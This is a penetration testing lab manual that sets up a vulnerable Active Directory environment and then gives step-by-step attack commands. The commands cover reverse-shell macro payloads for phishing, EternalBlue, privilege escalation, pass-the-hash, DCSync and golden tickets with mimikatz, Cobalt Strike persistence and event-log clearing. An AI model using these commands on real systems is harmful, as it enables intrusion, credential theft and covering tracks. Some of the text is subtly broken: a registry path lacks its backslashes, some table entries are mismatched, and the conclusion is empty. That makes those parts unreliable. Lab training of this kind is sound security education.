
# Penetration Testing Lab Manual

A Complete Guide to Building, Exploiting, and Compromising an Active Directory Environment in VMware Workstation

Table of Contents
• Introduction
• Lab Setup
• Required Software
• Network Configuration
• VM Installation
• Attacker Machine (Kali Linux)
• Windows Domain Controller (DC01)
• Windows Workstations (PC1, PC2)
• Linux Servers (WEB01, DB01)
• Active Directory Setup
• Vulnerable Applications & Misconfigurations
• Exploitation Path
• Initial Access
• Privilege Escalation
• Lateral Movement
• Domain Controller Compromise
• Post-Exploitation & Cleanup
• Conclusion

⸻

Introduction

This guide walks you through manually setting up a penetration testing lab in VMware Workstation with vulnerable machines and misconfigurations. You will install specific vulnerable software, exploit weaknesses, and escalate privileges to compromise an Active Directory domain controller.

⸻

Lab Setup

Required Software

Machine OS Software
Kali Linux Kali Linux nmap, metasploit, crackmapexec, mimikatz, bloodhound, impacket
Windows Server 2022 Windows Server 2022 Active Directory, DNS, SMB, RDP


Windows 10 Pro Windows 10 Vulnerable Apps: Java 7, Office 2016 (Macros), SMBv1
Windows 7 Windows 7 Vulnerable Apps: EternalBlue (MS17-010), Outdated IE


Ubuntu Web Server Ubuntu Server Vulnerable Apps: Apache 2.2.3, PHP 5.3.29, SQLi-prone CMS
Ubuntu Database Server Ubuntu Server Vulnerable Apps: MySQL 5.5, Weak Credentials



⸻

Network Configuration

Network Type Subnet Purpose
VMnet1 Host-Only 192.168.1.0/24 Internal Corporate Network
VMnet2 NAT 192.168.2.0/24 Attacker Network
VMnet3 Bridged 192.168.3.0/24 Internet Access (Optional)



⸻

VM Installation

Attacker Machine (Kali Linux)
1. Download Kali Linux from kali.org.
2. Create a VMware VM:
• OS: Linux > Debian 64-bit
• CPU: 4 Cores
• RAM: 4GB
• Network: VMnet2 (NAT)
3. Install and update:

sudo apt update && sudo apt upgrade -y



⸻

Windows Domain Controller (DC01)
1. Install Windows Server 2022.
2. Set up Active Directory (AD DS):

Install-ADDSForest -DomainName corp.local -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssword123" -AsPlainText -Force) -Force


3. Create domain users:

New-ADUser -Name "user1" -AccountPassword (ConvertTo-SecureString "P@ssword1" -AsPlainText -Force) -Enabled $true



⸻

Windows Workstations (PC1, PC2)
1. Install Windows 10 and Windows 7.
2. Install vulnerable applications:
• Java 7 (Download from Oracle archive).
• Office 2016 (Enable Macros).
• SMBv1:

Set-SmbServerConfiguration -EnableSMB1Protocol $true



⸻

Linux Servers (WEB01, DB01)
1. Install Ubuntu Server.
2. Install vulnerable software:

sudo apt install apache2 mysql-server php5



⸻

Vulnerable Applications & Misconfigurations

Service Vulnerability Exploit
SMBv1 EternalBlue ms17_010_eternalblue
Office Macros Malicious Macros msfvenom
SQL Server Weak Credentials sqlmap
Apache 2.2.3 Remote Code Execution exploit/multi/http/php_cgi_arg_injection



⸻

Exploitation Path

1. Initial Access

Phishing with Malicious Macros

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.100 LPORT=4444 -f vba > macro.vba

Send via phishing email and trigger a shell.

EternalBlue (SMB Exploit) on Windows 7

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.30
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit



⸻

2. Privilege Escalation

Finding Weak Privileges

winpeas.exe > output.txt

Exploit AlwaysInstallElevated:

reg add HKLMSoftwarePoliciesMicrosoftWindowsInstaller /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
msiexec /quiet /qn /i malicious.msi



⸻

3. Lateral Movement

Pass-the-Hash Attack

crackmapexec smb 192.168.1.10 -u admin -H <hash>

RDP Hijacking

query user
tscon 1 /dest:console



⸻

4. Domain Controller Compromise

DCSync Attack

mimikatz
lsadump::dcsync /domain:corp.local /user:Administrator

Golden Ticket Attack

mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-XXXX /krbtgt:<NTLM HASH>



⸻

Post-Exploitation & Cleanup

Maintaining Access
• Create a new domain admin user.
• Deploy Cobalt Strike beacon.

Clearing Tracks

wevtutil cl Security



⸻

Conclusion
